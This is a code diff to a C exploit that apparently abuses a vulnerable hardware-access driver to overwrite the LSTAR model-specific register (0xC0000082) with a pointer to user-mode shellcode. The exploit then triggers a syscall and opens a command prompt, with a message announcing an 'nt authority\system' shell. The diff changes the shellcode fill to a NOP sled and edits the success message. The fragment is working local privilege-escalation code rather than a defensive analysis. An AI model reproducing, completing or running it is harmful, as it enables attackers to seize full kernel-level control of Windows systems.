@@ -2,9 +2,6 @@
 
 int main(int argc, char** argv)
 {
-	// Register: 0xC0000082
-	// Value: pointer to shellcode
-
 	char unused = 0, output[4096], * shellcode_alloc = 0, syscall[2] = { 0x0F, 0x05 };
 	HANDLE h_driver = (HANDLE)-1;
 	OLS_WRITE_MSR_INPUT input;
@@ -41,7 +38,8 @@ int main(int argc, char** argv)
 	}
 	printf("\n[+] Allocated shellcode stack memory. Shellcode Stack Address: 0x%p", shellcode_alloc);
 
-	memset(shellcode_alloc, 0xCC, 4096);
+	memset(shellcode_alloc, 0x90, 4095);
+	*(char*)(shellcode_alloc + 4095) = 0xCC;
 	printf("\n[+] Mapped the shellcode onto the allocated stack memory.");
 
 	input.Register = 0xC0000082;
@@ -56,7 +54,7 @@ int main(int argc, char** argv)
 	invoke_syscall();
 
 	system("start C:\\Windows\\System32\\cmd.exe");
-	printf("\n[+] Finished!");
+	printf("\n[+] Enjoy your \"nt authority\\system\" shell!");
 
 	unused = getchar();
 
